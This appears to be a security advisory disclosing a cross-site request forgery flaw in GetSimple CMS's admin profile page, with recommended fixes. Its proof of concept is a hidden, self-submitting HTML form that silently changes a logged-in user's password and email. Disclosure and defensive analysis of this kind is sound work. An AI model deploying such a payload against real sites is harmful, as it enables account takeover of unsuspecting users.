## Critical CSRF Vulnerability in admin/profile.php Endpoint

## Vulnerability Details:
Application Name: GetSimple CMS
Software Link: [Download GetSimpleCMS v3.3.16](https://github.com/GetSimpleCMS/GetSimpleCMS/archive/refs/tags/v3.3.16.zip)
Vendor Homepage: [Vendor Homepage](https://github.com/tablatronix)
BUG: Cross-Site Request Forgery
BUG Author: Zeynalxan

### Vulnerability Overview
A Cross-Site Request Forgery (CSRF) vulnerability was identified in the `admin/profile.php` endpoint of the application. This vulnerability allows an attacker to perform unauthorized actions on behalf of an authenticated user without their consent, potentially compromising user accounts and sensitive information.

### Affected URL
- **Endpoint:** `https://localhost/admin/profile.php`

### Description
The application does not implement adequate CSRF protection mechanisms, allowing an attacker to execute arbitrary actions by crafting a malicious request. An attacker can exploit this vulnerability by tricking a victim (authenticated user) into clicking on a crafted link or visiting a malicious webpage, which would send a request to the vulnerable endpoint.

### Proof of Concept
A proof of concept (PoC) was created to demonstrate the CSRF vulnerability. The following HTML form was used to perform an unauthorized password change:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack POC</title>
</head>
<body>
    <h1>CSRF Attack Proof of Concept</h1>
    <form id="csrfForm" action="https://localhost/admin/profile.php" method="POST" style="display:none;">
        <input type="hidden" name="nonce" value="84315b997b0798aa316fcb424684c647402c7632">
        <input type="hidden" name="user" value="salam">
        <input type="hidden" name="email" value="salam@gmail.com">
        <input type="hidden" name="name" value="Seleme">
        <input type="hidden" name="timezone" value="Europe/Berlin">
        <input type="hidden" name="lang" value="en_US">
        <input type="hidden" name="show_htmleditor" value="1">
        <input type="hidden" name="sitepwd" value="Selme1234">
        <input type="hidden" name="sitepwd_confirm" value="Selme1234">
        <input type="hidden" name="submitted" value="Save Updates">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

### Steps to Reproduce
1. Ensure the target application is running on a local server.
2. Place the above HTML code in a file (e.g., `csrf_attack.html`).
3. Open the `csrf_attack.html` file in a web browser.
4. The form will automatically submit a request to `admin/profile.php`, changing the user's password without their consent.

### Impact
This vulnerability can lead to unauthorized actions being taken on behalf of users, including but not limited to:
- Unauthorized password changes.
- Modification of user profile details.
- Potential data leakage and account takeover.

### Recommendations
To mitigate this vulnerability, it is recommended to implement the following security measures:
- **CSRF Tokens**: Implement CSRF tokens for all state-changing requests. Ensure that each request includes a unique token that is validated by the server.
- **SameSite Cookie Attribute**: Use the `SameSite` attribute for cookies to restrict cross-origin requests.
- **User Confirmation**: Introduce confirmation steps for sensitive actions, such as password changes.

### Conclusion
The identified CSRF vulnerability poses a significant security risk to the application. Immediate action is required to implement proper CSRF protections to safeguard user accounts and sensitive information.
